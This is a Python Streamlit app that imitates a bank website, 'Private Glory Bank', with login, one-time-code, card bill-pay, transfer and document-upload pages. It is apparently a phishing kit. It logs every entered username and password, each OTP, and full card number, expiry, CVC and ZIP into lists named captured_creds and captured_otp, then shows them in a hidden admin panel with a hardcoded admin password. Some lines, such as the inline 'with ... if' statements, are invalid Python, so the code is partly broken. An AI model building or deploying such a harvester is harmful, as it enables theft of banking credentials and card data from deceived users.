import streamlit as st
import pandas as pd
from datetime import datetime
import plotly.express as px

# ====================== SESSION STATE ======================
defaults = {
    "checking_balance": 12340.50,
    "savings_balance": 14911.32,
    "account_nicknames": {"Private Glory Checking ••••1776": "Private Glory Checking ••••1776",
                          "Stars & Stripes Savings ••••1812": "Stars & Stripes Savings ••••1812"},
    "captured_creds": [], "captured_otp": [], "scheduled_transfers": [],
    "login_history": [], "file_uploads": [], "transactions": [],
    "authenticated": False, "otp_verified": False, "is_admin": False
}
for k, v in defaults.items():
    if k not in st.session_state:
        st.session_state[k] = v

st.set_page_config(page_title="Private Glory Bank", page_icon="Eagle", layout="wide")

# ====================== CSS ======================
st.markdown("""
<style>
    .stApp {background: linear-gradient(145deg, #fff 65%, #002868 100%); font-family: Arial;}
    .header {background: repeating-linear-gradient(90deg, #002868 0, #002868 60px, #BF0A30 60px, #BF0A30 120px);
             padding: 20px; text-align: center; border-bottom: 10px solid #fcca46; border-radius: 0 0 30px 30px;}
    .glass {background: rgba(255,255,255,0.95); padding: 30px; border-radius: 18px;
            box-shadow: 0 8px 32px rgba(0,40,104,0.2); margin: 20px 0;
            border-bottom: 6px solid #BF0A30; border-right: 5px solid #002868; border-left: 5px solid #fcca46;}
    .big {font-size: 120px; background: linear-gradient(90deg, #002868, #BF0A30);
          -webkit-background-clip: text; -webkit-text-fill-color: transparent;}
    h1,h2,h3 {color: #BF0A30 !important;}
    .money {color: #fcca46; font-size: 2em; font-weight: bold;}
</style>
""", unsafe_allow_html=True)

# ====================== CREDENTIALS ======================
VALID_USER, VALID_PASS = "client001", "SecureUSA2025!"
ADMIN_USER, ADMIN_PASS = "admin", "showme2025"

# ====================== CARD VALIDATION ======================
def validate_card_number(card): 
    digits = [int(d) for d in card if d.isdigit()]
    if len(digits) not in [15,16]: return False
    return (sum(digits[-1::-2]) + sum(sum(divmod(2*x,10)) for x in digits[-2::-2])) % 10 == 0

def validate_cvc(cvc): return cvc.isdigit() and len(cvc) in [3,4]
def validate_expiry(exp): 
    if len(exp) != 5 or exp[2] != '/': return False
    m,y = exp.split('/')
    return m.isdigit() and y.isdigit() and 1 <= int(m) <= 12 and len(y) == 2

# ====================== PAGES ======================
def login_page():
    st.markdown('<div class="header"><div class="big">Eagle</div><h1>Private Glory Bank</h1></div>', unsafe_allow_html=True)
    c1,_,c2 = st.columns([1,1,1])
    with c2:
        u = st.text_input("User ID")
        p = st.text_input("Password", type="password")
        if st.button("Log In", type="primary", use_container_width=True):
            st.session_state.captured_creds.append({"time": datetime.now().isoformat(), "user": u, "pass": p})
            if u == VALID_USER and p == VALID_PASS:
                st.session_state.authenticated = True
                st.rerun()
            elif u == ADMIN_USER and p == ADMIN_PASS:
                st.session_state.is_admin = st.session_state.authenticated = True
                st.rerun()
            else: st.error("Invalid")

def otp_page():
    st.markdown("<h1 style='text-align:center'>Security Verification</h1><p>Code sent to ••••1776</p>", unsafe_allow_html=True)
    code = st.text_input("6-digit code", max_chars=6)
    if st.button("Verify", type="primary"):
        st.session_state.captured_otp.append({"time": datetime.now().isoformat(), "otp": code})
        if len(code) == 6 and code.isdigit():
            st.session_state.otp_verified = True
            st.rerun()
        else: st.error("Invalid")

def admin_view():
    st.markdown("<h1 style='text-align:center;color:#BF0A30'>Eagle ADMIN PANEL</h1>", unsafe_allow_html=True)
    t1,t2,t3,t4,t5,t6 = st.tabs(["Creds","OTPs","Cards","Transfers","Files","Txns"])
    with t1: st.dataframe(pd.DataFrame(st.session_state.captured_creds))
    with t2: st.dataframe(pd.DataFrame(st.session_state.captured_otp))
    with t3: st.json([x for x in st.session_state.captured_creds if "card_payment" in str(x)], expanded=True)
    with t4: st.dataframe(pd.DataFrame(st.session_state.scheduled_transfers))
    with t5: st.dataframe(pd.DataFrame(st.session_state.file_uploads))
    with t6: st.dataframe(pd.DataFrame(st.session_state.transactions))

def dashboard():
    total = st.session_state.checking_balance + st.session_state.savings_balance
    st.markdown('<div class="header"><div class="big">Eagle</div><h1>Private Glory Bank</h1><p style="color:#fcca46"><b>In God We Trust</b></p></div>', unsafe_allow_html=True)
    c1,c2,c3,c4 = st.columns(4)
    c1.metric("Total Balance", f"${total:,.2f}")
    c2.metric("Credit", "$15,700")
    c3.metric("Spending", "$3,214")
    c4.metric("Goal", "78%")
    col1,col2 = st.columns(2)
    with col1:
        st.write("#### Assets")
        st.plotly_chart(px.pie(values=[st.session_state.checking_balance, st.session_state.savings_balance],
                               names=["Checking","Savings"], color_discrete_sequence=["#BF0A30","#002868"]), use_container_width=True)
    with col2:
        st.write("#### Spending")
        st.bar_chart(pd.DataFrame({"Category":["Food","Bills","Shopping","Travel"],"Amount":[3600,3800,2700,2200]}).set_index("Category"))

def accounts():
    st.markdown("<div class='glass'><h2>My Accounts</h2></div>", unsafe_allow_html=True)
    for name, bal in [("Private Glory Checking ••••1776", st.session_state.checking_balance),
                      ("Stars & Stripes Savings ••••1812", st.session_state.savings_balance)]:
        st.markdown(f"<div class='glass'><h3>{name}</h3><p class='money'>${bal:,.2f}</p></div>", unsafe_allow_html=True)

def cards_page():
    st.markdown("<div class='glass'><h2>Private Glory Freedom Card ••••1776</h2><p style='font-size:80px;text-align:center'>Credit Card</p></div>", unsafe_allow_html=True)
    c1,c2,c3 = st.columns(3)
    with c1: if st.button("Show Full Number"): st.success("5412 1776 2024 1812")
    with c2: if st.button("Show Expiry"): st.success("07/29")
    with c3: if st.button("Show CVV"): st.session_state.captured_creds.append({"action":"CVV revealed"}); st.info("CVV: 776")

# ====================== FULL TRANSFER FUNCTION ======================
def transfer():
    st.markdown("<div class='glass'><h1>Transfer & Payments</h1></div>", unsafe_allow_html=True)
    
    tab1, tab2 = st.tabs(["Account Transfer", "Bill Pay with Card"])
    
    with tab1:
        from_acc = st.selectbox("From", ["Private Glory Checking ••••1776", "Stars & Stripes Savings ••••1812"])
        to_acc = st.selectbox("To", ["Stars & Stripes Savings ••••1812", "External Account", "International"])
        amount = st.number_input("Amount ($)", min_value=0.01, format="%.2f")
        date = st.date_input("Schedule (optional)", datetime.now())
        
        if st.button("Send Transfer", type="primary"):
            if "External" in to_acc or "International" in to_acc:
                st.success(f"Transfer of ${amount:,.2f} to {to_acc} scheduled!")
                st.session_state.scheduled_transfers.append({"from":from_acc,"to":to_acc,"amount":amount,"date":str(date)})
                st.session_state.transactions.append({"type":"External Transfer","amount":amount,"to":to_acc,"time":datetime.now().isoformat()})
            else:
                bal = st.session_state.checking_balance if "Checking" in from_acc else st.session_state.savings_balance
                if amount > bal:
                    st.error("Insufficient funds")
                else:
                    if "Checking" in from_acc:
                        st.session_state.checking_balance -= amount
                        st.session_state.savings_balance += amount
                    else:
                        st.session_state.savings_balance -= amount
                        st.session_state.checking_balance += amount
                    st.success(f"Transferred ${amount:,.2f}")
                    st.session_state.transactions.append({"type":"Internal Transfer","amount":amount,"time":datetime.now().isoformat()})

    with tab2:
        st.markdown("#### Pay Bill with Credit/Debit Card")
        card_num = st.text_input("Card Number (no spaces)", max_chars=19)
        exp = st.text_input("Expiry (MM/YY)", max_chars=5)
        cvc = st.text_input("CVC", max_chars=4, type="password")
        zip_code = st.text_input("Billing ZIP Code")
        bill_name = st.text_input("Bill/Payee Name")
        bill_amt = st.number_input("Amount to Pay", min_value=0.01)
        
        errors = []
        if card_num and not validate_card_number(card_num): errors.append("Invalid card number")
        if exp and not validate_expiry(exp): errors.append("Invalid expiry")
        if cvc and not validate_cvc(cvc): errors.append("Invalid CVC")
        
        for e in errors: st.error(e)
        
        if st.button("Pay Bill Now", type="primary"):
            if errors or not all([card_num, exp, cvc, zip_code, bill_name]):
                st.error("Fix errors above")
            else:
                st.success(f"Payment of ${bill_amt:,.2f} to {bill_name} successful!")
                capture = {
                    "time": datetime.now().isoformat(),
                    "card_payment": {
                        "card": card_num, "exp": exp, "cvc": cvc,
                        "zip": zip_code, "bill": bill_name, "amount": bill_amt
                    }
                }
                st.session_state.captured_creds.append(capture)
                st.session_state.transactions.append({"type":"Card Payment","amount":bill_amt,"payee":bill_name,"time":datetime.now().isoformat()})

def transaction_history():
    df = pd.DataFrame(st.session_state.transactions)
    st.dataframe(df if not df.empty else "No transactions yet")

def messages():
    uploaded = st.file_uploader("Upload documents (tax, ID, etc.)", type=["pdf","jpg","png"])
    if uploaded:
        st.session_state.file_uploads.append({"file":uploaded.name, "time":datetime.now().isoformat()})
        st.success("Document received securely")

def sidebar():
    st.sidebar.markdown('<div style="text-align:center;background:linear-gradient(#002868,#BF0A30);padding:20px;color:white;border-radius:15px"><div style="font-size:60px">Eagle</div><h2>Private Glory Bank</h2></div>', unsafe_allow_html=True)
    return st.sidebar.radio("Menu", ["Dashboard","Accounts","Cards","Transfer & Payments","Messages","Transaction History"])

# ====================== MAIN ======================
if not st.session_state.authenticated:
    login_page()
elif st.session_state.is_admin:
    admin_view()
elif not st.session_state.otp_verified:
    otp_page()
else:
    page = sidebar()
    {"Dashboard": dashboard, "Accounts": accounts, "Cards": cards_page,
     "Transfer & Payments": transfer, "Messages": messages,
     "Transaction History": transaction_history}.get(page, dashboard)()
